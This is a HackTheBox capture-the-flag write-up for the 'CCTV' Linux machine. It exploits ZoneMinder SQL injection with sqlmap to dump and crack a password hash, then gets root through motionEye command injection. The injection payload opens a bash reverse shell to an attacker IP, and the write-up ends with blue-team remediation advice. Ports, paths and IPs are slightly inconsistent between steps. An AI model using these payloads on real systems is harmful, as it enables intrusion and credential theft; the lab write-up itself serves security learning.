---
title: CCTV
os: Linux
difficulty: Easy
tags:
  - SQL Injection
  - ZoneMinder
  - Hashcat
  - Chisel
  - motionEye
  - Command Injection
  - Privilege Escalation
  - CVE-2024-51428
  - CVE-2025-60787
---

# 🛡️ HTB - CCTV (Easy)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge" alt="Easy Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** CCTV
- **Operating System:** Linux (Ubuntu)
- **Difficulty:** Easy
- **Vulnerabilities:** SQL Injection in ZoneMinder (CVE-2024-51428), OS Command Injection in motionEye (CVE-2025-60787)

---

## Step 1 - Reconnaissance

Will Use Nmap To See what Ports and Services are Open

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.5.203
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-13 14:10 UTC
Nmap scan report for 10.129.5.203
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://cctv.htb/

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/13%OT=22%CT=1%CU=37963%PV=Y%DS=2%DC=T%G=Y%TM=69B4
OS:1B1E%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=104%TI=Z%CI=Z%TS=A)SEQ(SP
OS:=FD%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%
OS:O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2
OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   243.89 ms 10.10.14.1
2   237.41 ms 10.129.5.203

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.18 seconds
```

- 🔍 *Easy Peasy Linux machine.*
- 🔍 *Looking at the web page, it appears to be a monitoring service for security cameras.*
- 🔍 *It has a login page named ZoneMinder.*
- 🔍 *Typing the default credentials "admin" / "admin" granted authenticated access to the web panel.*
- 🔍 *The ZoneMinder software running is version 1.37.63.*

---

## Step 2 - Enumeration

- 🔍 *Searching for known vulnerabilities on ZoneMinder v1.37.63, we identified CVE-2024-51428.*

> [!IMPORTANT]
> **SQL Injection in ZoneMinder (CVE-2024-51428):**
> The application is vulnerable to an authenticated SQL Injection. The flaw is in the `tid` parameter within the `removetag` action of the event request, permitting attackers to inject malicious SQL queries. This is a Time-Based Blind SQL Injection.

> [!NOTE]
> **What is Time-Based Blind SQL Injection?**
> A Time-based SQL Injection vulnerability is a type of Blind SQL Injection where an attacker infers information by observing the time it takes for a database to respond to a specially crafted query.
> 
> Unlike traditional SQL injection, which displays database data directly on the page, time-based attacks are used when the application suppresses error messages and does not return any data in the response, making it "blind".
> 
> **How Time-Based SQL Injection Works:**
> 1. **Injecting Logic:** The attacker sends a request containing a SQL payload designed to ask a true/false question.
> 2. **Triggering a Delay:** If the condition is true, the database executes a time-consuming operation (a "sleep" command). If false, the database responds immediately.
> 3. **Observing the Delay:** The attacker measures the time it takes to receive the HTTP response. A delay confirms the condition was true.
> 4. **Data Extraction:** Repeated queries allow character-by-character extraction of database contents.

- 🔍 *In short, if we observe a delay in the server response, the SQL injection payload is successfully executing.*
- 🔍 *Confirming the SQL injection vulnerability using SQLMap:*

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    --cookie="ZMSESSID=i5ie78cg2qt7tsucl54kbbiu5r" \
    -p tid --dbms=mysql --batch
```

```text
sqlmap identified the following injection point(s) with a total of 93 HTTP(s) requests:
---
Parameter: tid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 8298 FROM (SELECT(SLEEP(5)))NBiO)
---
[14:27:08] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12
```

- 🔍 *Vulnerability Confirmed. The `tid` parameter is indeed vulnerable.*

> [!NOTE]
> **SQL Injection Mechanics:**
> The backend SQL query executes similarly to:
> `DELETE FROM Tags WHERE event_id = 1 AND tag_id = 1 AND (SELECT 8298 FROM (SELECT(SLEEP(5)))NBiO)`

- 🔍 *Dumping the database usernames using SQLMap:*

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    --cookie="ZMSESSID=i5ie78cg2qt7tsucl54kbbiu5r" \
    -p tid --dbms=mysql --batch -D zm -T Users -C "Username" --dump
```

```text
Database: zm
Table: Users
[3 entries]
+------------+
| Username   |
+------------+
| admin      |
| mark       |
| superadmin |
+------------+
```

- 🔍 *Database users dumped successfully. Let's dump the password hash for the user "mark":*

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    --cookie="ZMSESSID=gl5bdpecie4ug6sb2bet115ovk" \
    -p tid --dbms=mysql --batch -D zm -T Users -C "Password" --where="Username='mark'" --dump
```

```text
Database: zm
Table: Users
[1 entry]
+-------------------------------------------------------------------------+
| Password                                                                |
+-------------------------------------------------------------------------+
| $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07L\x01\x00\x017AJ/QNqZolbXKfFG. |
+-------------------------------------------------------------------------+
```

---

## Step 3 - Initial Foothold

- 🔍 *The hash is calculated using bcrypt (cost factor of 10) with standard clean characters:*
  `$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.`
- 🔍 *Running Hashcat to crack the bcrypt hash:*

```text
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZ...XKfFG.
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Candidates.#1....: sunshine2 -> opensesame
```

- 🔍 *The password for user mark is: opensesame.*
- 🔍 *SSH into the target host using mark's credentials:*

```bash
ssh mark@cctv.htb
```

```text
mark@cctv.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
System information as of Sat 14 Mar 13:56:50 UTC 2026
mark@cctv:~$
```

- 🔍 *Initial SSH session established as user mark.*

---

## Step 4 - Privilege Escalation

- 🔍 *Running LinPEAS for post-exploitation enumeration, we found an internal service running locally on port 8765/7999:*
```text
tcp        0      0 127.0.0.1:8765          0.0.0.0:*               LISTEN 
motioneye.service                        loaded active running motionEye Server
Potential issue in service: motioneye.service runs as root
```

- 🔍 *Since the service is bound to localhost, we will tunnel it to our attacker machine.*
- 🔍 *Starting the Chisel server on our attacker machine:*
```bash
./chisel-lin server --port 8099 --reverse --socks5
```
- 🔍 *Running the Chisel client on the target host:*
```bash
./chisel-lin client 10.10.14.8:8099 R:7999:127.0.0.1:7999
```
- 🔍 *Alternatively, tunnel via SSH local port forwarding:*
```bash
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```
- 🔍 *Reading the motionEye configuration file located at `/etc/motioneye/motion.conf`:*

```bash
cat /etc/motioneye/motion.conf
```

```text
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @normal_password 
```

- 🔍 *The admin password is a SHA-1 hash:* `989c5a8ee87a0e9521ec81a79187d162109282f0`.
- 🔍 *Entering the raw SHA-1 hash as the password in the motionEye login screen successfully logs us in.*
- 🔍 *The running motionEye version is v0.43.1b4, which is vulnerable to CVE-2025-60787.*

> [!WARNING]
> **motionEye Command Injection (CVE-2025-60787):**
> MotionEye v0.43.1b4 and earlier is vulnerable to OS Command Injection in configuration parameters such as `image_file_name`. Unsanitized user input is written directly to Motion configuration files, allowing remote authenticated administrators to achieve code execution as root when the service restarts.

- 🔍 *The client UI attempts to validate inputs using `configUiValid()`. We bypass this by opening the F12 browser developer console and overriding the validation function:*
```javascript
configUiValid = function() { return true; };
```
- 🔍 *Now, write the following command injection payload into the "Image File Name" input field:*
```text
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.14.8/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
```
- 🔍 *Start a listener on the attacker machine:*
```bash
nc -lvnp 4444
```
- 🔍 *Trigger the command execution by calling the snapshot action:*
```bash
curl "http://127.0.0.1:7999/1/action/snapshot"
```
- 🔍 *Catching the root shell on the netcat listener:*
```text
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.129.244.156] 36722
root@cctv:/etc/motioneye# whoami
root
```

- 🔍 *Root access achieved. The user flag is located at `/home/sa_mark/user.txt` and the root flag is at `/root/root.txt`.*

---

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Infrastructure & Application Security Assessment**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the CCTV environment. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Authenticated SQL Injection in ZoneMinder (CVE-2024-51428)

> [!WARNING]
> **Vulnerability Profile:**
> The ZoneMinder web application exposes an authenticated SQL Injection vulnerability on the `tid` parameter within the `removetag` action. 

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> SQL Injection allows attackers to query database schemas, bypass access controls, and dump password hashes of administrative users. By exploiting the time-based injection point, attackers can perform complete database dumping, leading directly to password cracking and lateral movement across SSH endpoints.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Update ZoneMinder to the latest secure release (v1.37.64 or newer) where query parameters are fully parameterized.
> - **Remediation:** Implement server-side input validation/casting to guarantee the `tid` parameter only accepts strict integer types.
> - **Detection:** Deploy a Web Application Firewall (WAF) to detect common SQL injection signatures (e.g., `AND SLEEP()`, `UNION SELECT`) directed to index pages.

---

### 🔴 motionEye Configuration Command Injection (CVE-2025-60787)

> [!WARNING]
> **Vulnerability Profile:**
> The motionEye surveillance panel is vulnerable to OS Command Injection via the `image_file_name` configuration parameter, which is written directly into backend configuration files.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Because the `motioneye` service daemon runs under the high-privilege `root` user context, successful command injection leads to an immediate and complete system compromise. Attackers can execute arbitrary system commands, establish persistent reverse shells, and compromise host confidentiality and integrity.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Update motionEye to a patched version that strips control characters (`$`, `(`, `)`, `;`, `&`) from configuration parameters.
> - **Remediation:** Enforce the principle of least privilege: configure the motionEye daemon to run under an unprivileged user context rather than `root`.
> - **Detection:** Use host intrusion detection systems (such as Sysmon or auditd) to monitor child processes spawned by web server daemons (e.g., python/motioneye launching `/bin/bash` or `/usr/bin/python3`).

---

### 🟡 Weak Password Controls and exposed SHA-1 Configuration Hashes

> [!WARNING]
> **Vulnerability Profile:**
> Local user credentials cracked easily via rockyou wordlist (opensesame). The motionEye admin password verification implementation allows using the raw SHA-1 hash instead of the plaintext password, bypassing hash protection mechanisms.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> If an attacker obtains read access to `/etc/motioneye/motion.conf`, they can instantly log in to the motionEye web portal without needing to crack the SHA-1 hash. Combined with weak SSH credentials, attackers can pivot easily from web vulnerabilities to local system shells.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Adjust configuration file permissions so `/etc/motioneye/motion.conf` is strictly read-only by the service owner (e.g., `chmod 600`).
> - **Remediation:** Fix the password hashing verify logic in the application codebase to verify against plaintext passwords and prevent raw hash inputs from validating successfully.
